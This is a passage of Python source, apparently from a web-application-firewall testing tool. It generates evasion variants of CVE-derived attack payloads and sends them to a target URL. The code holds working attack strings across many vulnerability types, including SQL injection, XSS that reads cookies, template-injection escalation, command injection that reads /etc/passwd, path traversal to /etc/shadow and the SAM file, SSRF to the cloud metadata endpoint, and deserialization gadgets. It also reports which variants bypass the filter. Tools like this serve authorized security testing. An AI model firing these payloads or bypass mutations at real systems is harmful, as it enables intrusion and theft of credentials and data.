                variants.append(p.replace(kw, f"/**/{''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(kw))}/**/"))
        # Case alternation
        variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)))
        # Whitespace substitution
        variants.append(p.replace(" ", "/**/"))
        variants.append(p.replace(" ", "%09"))
        variants.append(p.replace(" ", "%0a"))
        variants.append(p.replace(" ", "+"))
        # Quote alternation
        variants.append(p.replace("'", "\""))
        variants.append(p.replace("'", "%27"))
        variants.append(p.replace("'", "\\'"))
        # Numeric true variations
        variants.append(p.replace("1=1", "2=2"))
        variants.append(p.replace("1=1", "1<2"))
        variants.append(p.replace("OR 1=1", "OR 'a'='a'"))
        # Stacked query
        if ";" not in p:
            variants.append(p + ";--")
            variants.append(p + ";SELECT SLEEP(5)--")

    # ── XSS ─────────────────────────────────────────────────────────────
    if vt == "xss" or "<script" in p.lower() or "onerror" in p.lower() or "alert(" in p.lower():
        # Tag substitution
        variants.append(p.replace("<script>", "<ScRiPt>"))
        variants.append(p.replace("<script>", "<svg/onload="))
        variants.append(p.replace("<script>", "<img src=x onerror="))
        variants.append(p.replace("<script>", "<details open ontoggle="))
        variants.append(p.replace("<script>", "<body onload="))
        # Alert alternatives
        variants.append(p.replace("alert(1)", "confirm(1)"))
        variants.append(p.replace("alert(1)", "prompt(1)"))
        variants.append(p.replace("alert(1)", "alert`1`"))
        variants.append(p.replace("alert(1)", "alert(document.cookie)"))
        variants.append(p.replace("alert(1)", "alert(document.domain)"))
        # Encoding
        variants.append(p.replace("<", "\\x3c").replace(">", "\\x3e"))
        variants.append(p.replace("<", "\\u003c").replace(">", "\\u003e"))
        # Event handler swap
        variants.append(p.replace("onerror=", "onload="))
        variants.append(p.replace("onerror=", "onfocus="))
        variants.append(p.replace("onerror=", "onmouseover="))
        # Protocol handler
        if "javascript:" not in p:
            variants.append(f"javascript:{p}")

    # ── SSTI (Server-Side Template Injection) ───────────────────────────
    if vt == "ssti" or "{{" in p or "${" in p and "jndi" not in p.lower():
        # Jinja2 / Twig variations
        variants.append(p.replace("{{", "{%").replace("}}", "%}"))
        variants.append(p.replace("{{7*7}}", "{{7*'7'}}"))
        variants.append(p.replace("{{", "${{").replace("}}", "}}"))
        # Payload escalation
        if "7*7" in p:
            variants.append(p.replace("7*7", "config"))
            variants.append(p.replace("7*7", "self.__class__.__mro__"))
            variants.append(p.replace("7*7", "request.application.__globals__"))
            variants.append(p.replace("{{7*7}}", "{{''.__class__.__mro__[1].__subclasses__()}}"))
        # Freemarker
        variants.append(p.replace("{{", "${").replace("}}", "}"))
        # EL injection
        variants.append(p.replace("{{", "${").replace("}}", "}"))
        if "${" in p:
            variants.append(p.replace("${", "#{"))

    # ── Command Injection / RCE ─────────────────────────────────────────
    if vt in ("rce", "command_injection") or any(s in p for s in ("; ", "| ", "$(", "`")):
        # Separator variations
        variants.append(p.replace(";", "%0a"))
        variants.append(p.replace(";", "\n"))
        variants.append(p.replace(";", "&&"))
        variants.append(p.replace("|", "||"))
        variants.append(p.replace("|", "%7c"))
        # Command alternatives
        cmd_swaps = {
            "id": ["whoami", "uname -a", "cat /etc/hostname"],
            "whoami": ["id", "echo $USER", "printenv USER"],
            "cat /etc/passwd": ["head -1 /etc/passwd", "tail -1 /etc/passwd", "sort /etc/passwd"],
            "ls": ["dir", "find . -maxdepth 1", "echo *"],
            "wget": ["curl", "fetch", "lwp-download"],
            "curl": ["wget", "python -c 'import urllib'", "nc"],
        }
        for orig, alts in cmd_swaps.items():
            if orig in p:
                for alt in alts:
                    variants.append(p.replace(orig, alt))
        # IFS bypass (space filtering)
        variants.append(p.replace(" ", "${IFS}"))
        variants.append(p.replace(" ", "$IFS$9"))
        variants.append(p.replace(" ", "{,}"))
        # Char-by-char construction
        if "cat" in p:
            variants.append(p.replace("cat", "c''a''t"))
            variants.append(p.replace("cat", "c\\at"))
            variants.append(p.replace("cat", "/bin/cat"))

    # ── Path Traversal / LFI ────────────────────────────────────────────
    if vt in ("lfi", "path_traversal") or "../" in p:
        # Depth variations
        variants.append(p.replace("../", "..../"))
        variants.append(p.replace("../", "....//"))
        variants.append(p.replace("../", "..%2f"))
        variants.append(p.replace("../", "%2e%2e/"))
        variants.append(p.replace("../", "%2e%2e%2f"))
        variants.append(p.replace("../", "..%252f"))
        variants.append(p.replace("../", "..\\"))
        # Deeper traversal
        if p.count("../") < 10:
            variants.append(p.replace("../", "../../"))
        # Null byte (pre-5.3 PHP)
        if ".php" not in p and "%00" not in p:
            variants.append(p + "%00")
            variants.append(p + "%00.html")
        # Target file alternatives
        file_swaps = {
            "/etc/passwd": ["/etc/shadow", "/etc/hosts", "/proc/self/environ", "/proc/version"],
            "etc/passwd": ["etc/shadow", "etc/hosts", "proc/self/environ", "proc/version"],
            "win.ini": ["boot.ini", "windows/system32/config/sam"],
        }
        for orig, alts in file_swaps.items():
            if orig in p:
                for alt in alts:
                    variants.append(p.replace(orig, alt))
        # PHP filter wrapper
        if "php" in p.lower() and "php://" not in p:
            variants.append(p.replace("../", "") + "&file=php://filter/convert.base64-encode/resource=index")

    # ── SSRF ────────────────────────────────────────────────────────────
    if vt == "ssrf" or "127.0.0.1" in p or "localhost" in p:
        # IP representation alternatives
        variants.append(p.replace("127.0.0.1", "0x7f000001"))
        variants.append(p.replace("127.0.0.1", "2130706433"))
        variants.append(p.replace("127.0.0.1", "0177.0.0.1"))
        variants.append(p.replace("127.0.0.1", "0"))
        variants.append(p.replace("127.0.0.1", "[::1]"))
        variants.append(p.replace("127.0.0.1", "localhost"))
        variants.append(p.replace("localhost", "127.0.0.1"))
        # Protocol alternatives
        variants.append(p.replace("http://", "gopher://"))
        variants.append(p.replace("http://", "dict://"))
        variants.append(p.replace("http://", "file:///"))
        # Cloud metadata endpoints
        if "169.254.169.254" not in p:
            variants.append(p.replace("127.0.0.1", "169.254.169.254"))
        # DNS rebinding hint
        variants.append(p.replace("127.0.0.1", "spoofed.burpcollaborator.net"))

    # ── Deserialization ─────────────────────────────────────────────────
    if vt == "deserialization" or "ysoserial" in p.lower() or "ObjectInputStream" in p:
        # Gadget chain variations
        gadget_swaps = {
            "CommonsCollections1": ["CommonsCollections5", "CommonsCollections6", "CommonsCollections7"],
            "Groovy1": ["Spring1", "Spring2"],
            "CommonsBeanutils1": ["CommonsBeanutils2"],
        }
        for orig, alts in gadget_swaps.items():
            if orig in p:
                for alt in alts:
                    variants.append(p.replace(orig, alt))
        # Command in gadget
        if "calc" in p:
            variants.append(p.replace("calc", "id"))
            variants.append(p.replace("calc", "whoami"))

    # ── Auth Bypass ─────────────────────────────────────────────────────
    if vt == "auth_bypass":
        variants.append(p.replace("admin", "Admin"))
        variants.append(p.replace("admin", "ADMIN"))
        variants.append(p.replace("admin", "admin' --"))
        variants.append(p.replace("admin", "admin'/*"))
        if "true" in p.lower():
            variants.append(p.replace("true", "True"))
            variants.append(p.replace("true", "1"))

    return [v for v in variants if v != p and v.strip()]


def mutate_cve_payload(
    payload: Dict[str, Any],
    max_variants: int = 12,
) -> List[Dict[str, Any]]:
    """Generate context-aware variants of a CVE payload.

    Takes a payload dict (from generate_payloads_from_cve) and generates
    encoding/obfuscation/parameter variants that a real attacker might use.

    Args:
        payload: Payload dict with keys: payload, method, path, headers, body, vuln_type
        max_variants: Max number of variants to generate.

    Returns:
        List of variant dicts, each with 'payload', 'mutation', 'original'.
    """
    variants: List[Dict[str, Any]] = []
    seen = {payload.get("payload", "")}
    original = payload.get("payload", "")
    method = payload.get("method", "GET")
    path = payload.get("path", "")
    headers = payload.get("headers", {})
    body = payload.get("body", "")
    vuln_type = payload.get("vuln_type", "")

    # 1. Path mutations (for PoC payloads with paths)
    if path and "?" in path:
        base, query = path.split("?", 1)
        # Mutate the query string
        for mq in _mutate_params(query)[:3]:
            variant_path = f"{base}?{mq}"
            if variant_path not in seen:
                seen.add(variant_path)
                v = dict(payload)
                v["payload"] = variant_path
                v["path"] = variant_path
                v["mutation"] = "param_encoding"
                v["original"] = original
                variants.append(v)

        # Mutate the base path
        for mp in _mutate_path(base)[:2]:
            variant_path = f"{mp}?{query}"
            if variant_path not in seen:
                seen.add(variant_path)
                v = dict(payload)
                v["payload"] = variant_path
                v["path"] = variant_path
                v["mutation"] = "path_encoding"
                v["original"] = original
                variants.append(v)
    elif path:
        for mp in _mutate_path(path)[:3]:
            if mp not in seen:
                seen.add(mp)
                v = dict(payload)
                v["payload"] = mp
                v["path"] = mp
                v["mutation"] = "path_encoding"
                v["original"] = original
                variants.append(v)

    # 2. Header mutations
    if headers:
        for mh in _mutate_headers(headers)[:2]:
            v = dict(payload)
            v["headers"] = mh
            v["mutation"] = "header_bypass"
            v["original"] = original
            # Mark as unique by header combo
            hkey = str(sorted(mh.items()))
            if hkey not in seen:
                seen.add(hkey)
                variants.append(v)

    # 3. Body mutations
    if body:
        for mb in _mutate_body(body, vuln_type)[:3]:
            if mb not in seen:
                seen.add(mb)
                v = dict(payload)
                v["body"] = mb
                v["mutation"] = "body_obfuscation"
                v["original"] = original
                variants.append(v)

    # 4. Vuln-type-aware payload mutations (highest priority for context)
    if original and vuln_type:
        for mp in _mutate_payload_by_vuln_type(original, vuln_type)[:6]:
            if mp not in seen:
                seen.add(mp)
                v = dict(payload)
                v["payload"] = mp
                v["mutation"] = f"vuln_{vuln_type}"
                v["original"] = original
                variants.append(v)

    # 5. Generic payload mutations (fill remaining slots with encoding variants)
    if not path and not body and original:
        try:
            from fray.mutator import mutate_payload as _generic_mutate
            remaining = max(0, max_variants - len(variants) - 1)
            generic = _generic_mutate(original, max_variants=remaining)
            for g in generic:
                gp = g["payload"]
                if gp not in seen:
                    seen.add(gp)
                    v = dict(payload)
                    v["payload"] = gp
                    v["mutation"] = g["strategy"]
                    v["original"] = original
                    variants.append(v)
        except ImportError:
            pass

    # 6. Method swap (GET↔POST)
    if method in ("GET", "POST") and (path or body):
        v = dict(payload)
        v["method"] = "POST" if method == "GET" else "GET"
        v["mutation"] = "method_swap"
        v["original"] = original
        variants.append(v)

    return variants[:max_variants]


def interactive_cve_payloads(result: Dict[str, Any], target: str = ""):
    """Interactive mode: show payloads + variants, let user select which to send.

    Args:
        result: Output from generate_payloads_from_cve().
        target: Optional URL to test payloads against.
    """
    B = "\033[1m"
    D = "\033[2m"
    R = "\033[0m"
    RED = "\033[91m"
    YEL = "\033[93m"
    GRN = "\033[92m"
    CYN = "\033[96m"

    payloads = result.get("payloads", [])
    if not payloads:
        print(f"  {YEL}No payloads to work with.{R}")
        return

    # Print header
    cve_id = result.get("cve_id", "")
    print(f"\n{D}{'━' * 64}{R}")
    print(f"  {B}CVE Payload Lab{R}  {CYN}{cve_id}{R}")
    print(f"  {D}Select a payload → see variants → send{R}")
    print(f"{D}{'━' * 64}{R}\n")

    while True:
        # List payloads
        print(f"  {B}Payloads:{R}")
        for i, p in enumerate(payloads, 1):
            src = p.get("source", "template")
            tag = f"{GRN}PoC{R}" if src == "poc" else f"{D}tmpl{R}"
            method = p.get("method", "")
            path = p.get("path", "")
            if method and path and src == "poc":
                print(f"    {CYN}{i:2d}{R}. [{tag}] {method} {path[:50]}")
            else:
                print(f"    {CYN}{i:2d}{R}. [{tag}] {p['payload'][:55]}")

        print(f"\n  {D}Enter number to expand, 'a' to send all, 'q' to quit{R}")

        try:
            choice = input(f"  {B}>{R} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice in ("q", "quit", "exit"):
            break

        if choice in ("a", "all"):
            if not target:
                print(f"  {YEL}No --test-target specified. Use -T <url> to test.{R}")
                continue
            _send_payloads(payloads, target)
            continue

        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(payloads):
                print(f"  {YEL}Invalid number{R}")
                continue
        except ValueError:
            print(f"  {YEL}Enter a number, 'a', or 'q'{R}")
            continue

        selected = payloads[idx]

        # Show details
        print(f"\n  {D}{'─' * 60}{R}")
        print(f"  {B}Original Payload:{R}")
        src = selected.get("source", "template")
        tag = f"{GRN}[PoC]{R}" if src == "poc" else f"{D}[tmpl]{R}"
        method = selected.get("method", "GET")
        path = selected.get("path", "")
        print(f"    {tag} {method} {selected['payload'][:70]}")
        if selected.get("headers"):
            for k, v in list(selected["headers"].items())[:3]:
                print(f"    {D}  {k}: {v[:40]}{R}")
        if selected.get("body"):
            print(f"    {D}  body: {selected['body'][:60]}{R}")

        # Generate variants
        variants = mutate_cve_payload(selected, max_variants=8)

        if variants:
            print(f"\n  {B}Variants ({len(variants)}):{R}")
            for j, v in enumerate(variants, 1):
                mutation = v.get("mutation", "?")
                vm = v.get("method", method)
                vpath = v.get("path", "")
                vpayload = v.get("payload", "")[:55]
                if vpath and vm:
                    print(f"    {YEL}{j:2d}{R}. [{mutation:18s}] {vm} {vpath[:50]}")
                else:
                    print(f"    {YEL}{j:2d}{R}. [{mutation:18s}] {vpayload}")
                if v.get("body") and v["body"] != selected.get("body", ""):
                    print(f"        {D}body: {v['body'][:55]}{R}")
                if v.get("headers") and v["headers"] != selected.get("headers", {}):
                    diff_keys = [k for k in v["headers"] if k not in selected.get("headers", {})]
                    if diff_keys:
                        print(f"        {D}+headers: {', '.join(diff_keys)}{R}")
        else:
            print(f"\n  {D}No variants generated for this payload{R}")

        # Sub-menu
        all_options = [selected] + variants
        print(f"\n  {D}Enter variant # to send, 'o' for original, 's' for all similar, 'b' to go back{R}")
        try:
            sub = input(f"  {B}>{R} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if sub == "b":
            continue
        elif sub == "o":
            if target:
                _send_payloads([selected], target)
            else:
                _print_sendable([selected])
        elif sub == "s":
            if target:
                _send_payloads(all_options, target)
            else:
                _print_sendable(all_options)
        else:
            try:
                vidx = int(sub) - 1
                if 0 <= vidx < len(variants):
                    if target:
                        _send_payloads([variants[vidx]], target)
                    else:
                        _print_sendable([variants[vidx]])
                else:
                    print(f"  {YEL}Invalid variant number{R}")
            except ValueError:
                pass


def _send_payloads(payloads: List[Dict[str, Any]], target: str):
    """Send payloads to target and show results."""
    B = "\033[1m"
    D = "\033[2m"
    R = "\033[0m"
    RED = "\033[91m"
    GRN = "\033[92m"

    try:
        from fray.tester import WAFTester
    except ImportError:
        print(f"  {RED}fray.tester not available{R}")
        return

    tester = WAFTester(target, timeout=8, delay=0.3)
    tested = blocked = 0

    print(f"\n  {B}Sending {len(payloads)} payload(s) → {target}{R}")
    for p in payloads:
        payload_str = p.get("payload", "")
        mutation = p.get("mutation", "original")
        try:
            r = tester.test_payload(payload_str)
            tested += 1
            status = r.get("status_code", "?")
            is_blocked = r.get("blocked", False)
            if is_blocked:
                blocked += 1
                print(f"    {RED}✗ BLOCKED{R}  [{mutation:18s}]  HTTP {status}  {payload_str[:40]}")
            else:
                print(f"    {GRN}✓ PASSED{R}   [{mutation:18s}]  HTTP {status}  {payload_str[:40]}")
        except Exception as e:
            print(f"    {D}? ERROR    [{mutation:18s}]  {str(e)[:40]}{R}")

    bypassed = tested - blocked
    print(f"\n  {B}Results:{R} {tested} tested, {GRN}{bypassed} bypassed{R}, {RED}{blocked} blocked{R}")


def _print_sendable(payloads: List[Dict[str, Any]]):
    """Print payloads in copy-pastable format (no target specified)."""
    B = "\033[1m"
    D = "\033[2m"
    R = "\033[0m"
    CYN = "\033[96m"

    print(f"\n  {B}Copy-pastable payloads:{R}")
    for p in payloads:
        method = p.get("method", "GET")
        path = p.get("path", "")
        payload_str = p.get("payload", "")
        headers = p.get("headers", {})
        body = p.get("body", "")
        mutation = p.get("mutation", "original")

        if path and method:
            # Print as curl command
            cmd = f"curl -X {method} 'TARGET{path}'"
            for k, v in headers.items():
                cmd += f" -H '{k}: {v}'"
            if body:
                cmd += f" -d '{body}'"
            print(f"    {D}# {mutation}{R}")
            print(f"    {CYN}{cmd}{R}")
        else:
            print(f"    {D}# {mutation}{R}")
            print(f"    {CYN}{payload_str}{R}")
    print(f"\n  {D}Replace TARGET with your target URL{R}")


# ── CLI-friendly output ──────────────────────────────────────────────────────

def print_cve_payloads(result: Dict[str, Any]):
    """Pretty-print CVE payload generation results."""
    B = "\033[1m"
    D = "\033[2m"
    R = "\033[0m"
    RED = "\033[91m"
    YEL = "\033[93m"
    GRN = "\033[92m"
    CYN = "\033[96m"

    print(f"\n{D}{'━' * 60}{R}")
    print(f"  {B}CVE → Payload Generator{R}")
    if result.get("cve_id"):
        print(f"  {CYN}{result['cve_id']}{R}", end="")
        if result.get("cvss_score"):
            score = result["cvss_score"]
            color = RED if score >= 7.0 else YEL if score >= 4.0 else GRN
            print(f"  {color}CVSS {score}{R}")
        else:
            print()
    print(f"{D}{'━' * 60}{R}")

    # Description
    desc = result.get("description", "")
    if desc:
        # Wrap at 56 chars
        words = desc.split()
        lines = []
        line = "  "
        for w in words:
            if len(line) + len(w) > 58:
                lines.append(line)
                line = "  "
            line += w + " "
        if line.strip():
            lines.append(line)
        for l in lines[:4]:
            print(f"  {D}{l.strip()}{R}")
        if len(lines) > 4:
            print(f"  {D}...{R}")

    # Vuln types
    vtypes = result.get("vuln_types", [])
    if vtypes:
        types_str = ", ".join(f"{v['type']}({v['severity']})" for v in vtypes)
        print(f"\n  {B}Classification:{R} {types_str}")

    # Affected software
    affected = result.get("affected_software", [])
    if affected:
        sw = ", ".join(f"{a['vendor']}/{a['product']}" for a in affected[:3])
        print(f"  {B}Affected:{R} {sw}")

    # Parameters
    params = result.get("parameters", {})
    if params:
        print(f"  {B}Extracted:{R} {', '.join(f'{k}={v}' for k, v in params.items())}")

    # PoC sources
    poc_sources = result.get("poc_sources", [])
    if poc_sources:
        print(f"\n  {B}Exploit References ({len(poc_sources)}){R}")
        icons = {"github_repo": "🐙", "packetstorm": "📦", "exploitdb": "💾",
                 "github_advisory": "🔒", "blog": "📝"}
        for ref in poc_sources[:4]:
            icon = icons.get(ref.get("source", ""), "🔗")
            print(f"    {icon} {D}{ref.get('url', '')[:62]}{R}")

    # Payloads
    payloads = result.get("payloads", [])
    if payloads:
        poc_count = sum(1 for p in payloads if p.get("source") == "poc")
        tmpl_count = len(payloads) - poc_count
        label = f"Payloads ({len(payloads)})"
        if poc_count:
            label += f"  {GRN}●{R} {poc_count} from PoC  {D}●{R} {tmpl_count} from templates"
        print(f"\n  {B}{label}{R}")
        for i, p in enumerate(payloads, 1):
            sev = p.get("severity", "medium")
            color = RED if sev in ("critical",) else YEL if sev == "high" else GRN
            technique = p.get("technique", "")
            context = p.get("context", "")
            source = p.get("source", "template")
            src_tag = f"{GRN}[PoC]{R}" if source == "poc" else f"{D}[tmpl]{R}"
            method = p.get("method", "")
            path = p.get("path", "")

            payload_display = p['payload'][:55]
            if method and path and source == "poc":
                print(f"    {color}{i:2d}.{R} {src_tag} {method} {path}")
                if payload_display != path:
                    print(f"        {D}payload: {payload_display}{R}")
            else:
                print(f"    {color}{i:2d}.{R} {src_tag} {payload_display}")

            if technique or context:
                print(f"        {D}{p.get('vuln_type','')} | {technique} | {context}{R}")
            if p.get("headers") and source == "poc":
                hdrs = ", ".join(f"{k}: {v[:20]}" for k, v in list(p["headers"].items())[:2])
                print(f"        {D}headers: {hdrs}{R}")
            if p.get("body") and source == "poc":
                print(f"        {D}body: {p['body'][:55]}{R}")
            if p.get("source_file") and source == "poc":
                print(f"        {D}from: {p['source_file']}{R}")

    # Error
    if result.get("error"):
        print(f"\n  {YEL}Note: {result['error']}{R}")

    print(f"\n{D}{'━' * 60}{R}\n")
